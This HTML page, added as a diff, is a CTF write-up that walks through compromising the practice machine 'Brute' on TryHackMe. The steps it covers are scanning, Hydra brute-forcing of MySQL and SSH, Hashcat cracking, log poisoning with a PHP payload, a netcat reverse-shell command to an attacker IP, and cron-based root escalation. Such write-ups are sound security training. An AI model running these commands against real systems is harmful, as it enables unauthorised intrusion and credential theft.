@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Mobile viewport optimization -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Hacking Brute.thm: A CTF Walkthrough</title>
+
+    <!-- SEO Meta Tags -->
+    <meta name="description" content="A detailed CTF walkthrough for the TryHackMe room 'Brute'. Follow the steps from initial Nmap scan to root privilege escalation using tools like Hydra, Hashcat, and log poisoning.">
+    <meta name="keywords" content="TryHackMe, Brute, CTF, Walkthrough, Writeup, Penetration Testing, Hacking, Hydra, Hashcat, Log Poisoning, Privilege Escalation, Nmap, Gobuster">
+    <meta name="author" content="Naveen Bose">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Hacking Brute.thm: A CTF Walkthrough">
+    <meta property="og:description" content="A detailed CTF walkthrough for the TryHackMe room 'Brute', from initial scan to root.">
+    <meta property="og:image" content="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/brute.png">
+    <meta property="og:url" content="https://tryhackme.com/p/N4V33N">
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Hacking Brute.thm: A CTF Walkthrough">
+    <meta name="twitter:description" content="A detailed CTF walkthrough for the TryHackMe room 'Brute', from initial scan to root.">
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/brute.png">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        .prose code {
+            color: #f87171;
+            font-family: 'Roboto Mono', monospace;
+            font-weight: 600;
+        }
+        .prose pre {
+            background-color: #1f2937;
+            border: 1px solid #374151;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            overflow-x: auto;
+        }
+         .prose pre code {
+            color: #d1d5db;
+            font-weight: normal;
+        }
+        .prose img {
+            border-radius: 0.5rem;
+            border: 1px solid #4b5563;
+        }
+        .prose > * {
+            margin-top: 2rem;
+            margin-bottom: 2rem;
+        }
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-300">
+
+    <div class="container mx-auto px-4 py-8 md:py-16">
+        <article class="prose prose-invert lg:prose-xl max-w-4xl mx-auto">
+            <header class="mb-12 text-left flex items-center space-x-8 border-b border-gray-700 pb-8">
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/brute.png" alt="Brute" class="w-32 h-auto flex-shrink-0">
+                <div>
+                    <div class="flex items-center space-x-4">
+                         <h1 class="text-5xl font-bold tracking-tight text-white">Brute</h1>
+                         <span class="text-base font-medium bg-gray-700 text-gray-300 px-4 py-1 rounded-full border border-gray-600">Write-up</span>
+                    </div>
+                    <p class="text-xl text-gray-400 mt-2">You as well, Brutus?</p>
+                </div>
+            </header>
+
+            <p>First things first, I needed to map the IP to the hostname in my <code>/etc/hosts</code> file so I could access it by name. A quick addition did the trick:</p>
+            <pre><code>echo "10.201.4.56 brute.thm" >> /etc/hosts</code></pre>
+
+            <p>With that set up, my journey started with an Nmap scan to see what I was up against.</p>
+            <pre><code>nmap -sC -sV -T4 -vv brute.thm</code></pre>
+            <p>The scan lit up with a few interesting ports: SSH, FTP, a web server, and an open MySQL port.</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/nmap.jpg" alt="nmap.jpg">
+            </figure>
+
+            <p>While checking out the web server, I ran a quick <code>gobuster</code> scan to find hidden directories.</p>
+            <pre><code>gobuster dir -u http://brute.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</code></pre>
+            <p>This revealed a <code>config.php</code> file, which is always a good find.</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/gobust.jpg" alt="gobust.jpg">
+            </figure>
+
+            <p>My first thought was to attack the low-hanging fruit. I tried brute-forcing the web login form and the FTP service, but both came up empty. After hitting a wall, I turned my attention to that open MySQL port. I pointed Hydra at the root user with the classic <code>rockyou.txt</code> wordlist, and this time, I struck gold.</p>
+            <pre><code>hydra -l root -P /usr/share/wordlists/rockyou.txt -t 50 brute.thm mysql</code></pre>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/mysql%20bruteforce.jpg" alt="mysql bruteforce.jpg">
+            </figure>
+
+            <p>With the root password found, I logged into the database to see what I could find.</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/sql%20login.jpg" alt="sql login.jpg">
+            </figure>
+
+            <p>Inside the 'website' database, there was a 'users' table.</p>
+             <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/show%20tables.jpg" alt="show tables.jpg">
+            </figure>
+
+            <p>This table gave me my next big clue: a user named 'Adrian' and a bcrypt hash of his password.</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/select%20from%20users.jpg" alt="select from users.jpg">
+            </figure>
+
+            <p>I immediately saved this hash to a file and set Hashcat to work on it with the trusty <code>rockyou.txt</code> wordlist.</p>
+            <pre><code>hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+            <p>Success! Hashcat made quick work of the hash and returned the password.</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/hashcat%20cracked.jpg" alt="hashcat cracked.jpg">
+            </figure>
+
+            <p>With Adrian's password in hand, I went back to the web application's login page. Using the cracked credentials, I was able to log in successfully. Once inside, I noticed a section on the web page that displayed system logs. It clearly showed all the recent failed FTP login attempts, including my own earlier brute-force attempts. This made me realize that whatever was entered as a username during an FTP login attempt was being logged and then rendered on the web page. This looked like a perfect opportunity for log poisoning. I decided to try injecting a PHP reverse shell payload as the username.</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/ftp%20php%20.jpg" alt="ftp php .jpg">
+            </figure>
+            <p>By checking the system's auth logs again through the web interface, I could see my payload being written successfully.</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/logpositioning.jpg" alt="logpositioning.jpg">
+            </figure>
+            <p>Once the payload was in the logs, I set up my listener and triggered the code by visiting the log page, which got me a reverse shell as the <code>www-data</code> user.</p>
+            <pre><code>busybox nc 10.201.4.90 1337 -e sh</code></pre>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/foothold.jpg" alt="foothold.jpg">
+            </figure>
+
+             <p>As the <code>www-data</code> user, one of the first things I did was check for other users on the system.</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/found%20another%20user.jpg" alt="found another user.jpg">
+            </figure>
+
+            <p>Then I explored the webroot at <code>/var/www/html</code> and took a closer look at that <code>config.php</code> file I found earlier. It contained database credentials for the user 'adrian'!</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/found%20adrian%20db%20passwd.jpg" alt="found adrian db passwd.jpg">
+            </figure>
+
+            <p>I immediately tried to SSH as 'adrian' with this password, but it failed. It was a dead end for now. So, I kept enumerating and found a very interesting file in Adrian's home directory: <code>.reminder</code>.</p>
+             <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/reminder.jpg" alt="Reminder file contents">
+            </figure>
+
+            <p>This was the real hint! It was a clear pointer to use Hashcat's rule-based attacks. The plan was to take the word `ettubrute`, apply the `best64.rule` set, and then append an exclamation mark to every result. I used Hashcat to generate a new password list called `password.txt` based on these rules.</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/custom%20rule.jpg" alt="custom rule.jpg">
+            </figure>
+
+            <p>With my new custom wordlist created, it was time to pivot to the user 'adrian'. I launched Hydra against the SSH service using my freshly generated wordlist, and it found Adrian's password almost immediately.</p>
+            <pre><code>hydra -l adrian -P password.txt -t 50 brute.thm ssh</code></pre>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/cracked%20ssh%20for%20adrian.jpg" alt="cracked ssh for adrian.jpg">
+            </figure>
+
+            <p>Now logged in as 'adrian', I found a few more interesting files. First, a script called <code>punch_in.sh</code> that was clearly being run on a schedule.</p>
+             <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/punch_in.jpg" alt="punch_in.jpg">
+            </figure>
+
+            <p>Then I found the real jackpot in a file named <code>.notes</code>, which referenced a script the admin had asked Adrian to write. This script was being run by root!</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/hint_prevesc.jpg" alt="hint_prevesc.jpg">
+            </figure>
+
+            <p>The script was executing whatever was on each line of the <code>/home/adrian/punch_in</code> file. This was the final key. I wrote a command to that file to set the SUID bit on bash.</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/escalation.jpg" alt="escalation.jpg">
+            </figure>
+
+            <p>After waiting a minute for the cron job to run, I simply executed <code>bash -p</code> and was greeted with a root shell.</p>
+            <figure>
+                <img src="https://raw.githubusercontent.com/N4V33NB0S3/portfolio/main/blogs/assets/brute/root.jpg" alt="root.jpg">
+            </figure>
+
+            <p class="font-bold text-lg mt-8 text-center">And that was it! A really enjoyable machine from start to finish. Thanks for reading along!</p>
+
+            <footer class="mt-16 pt-8 border-t border-gray-700 text-center text-gray-400">
+                <div class="flex justify-center items-center space-x-8">
+                    <a href="mailto:naveenbose1206@gmail.com" class="text-gray-400 hover:text-white transition-colors duration-300" title="Contact via Email">
+                        <svg class="w-8 h-8" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"></path><path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"></path></svg>
+                    </a>
+                    <a href="https://tryhackme.com/p/N4V33N" target="_blank" rel="noopener noreferrer" class="text-gray-400 hover:text-white transition-colors duration-300" title="TryHackMe Profile">
+                         <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
+                    </a>
+                </div>
+            </footer>
+
+        </article>
+    </div>
+
+</body>
+</html>
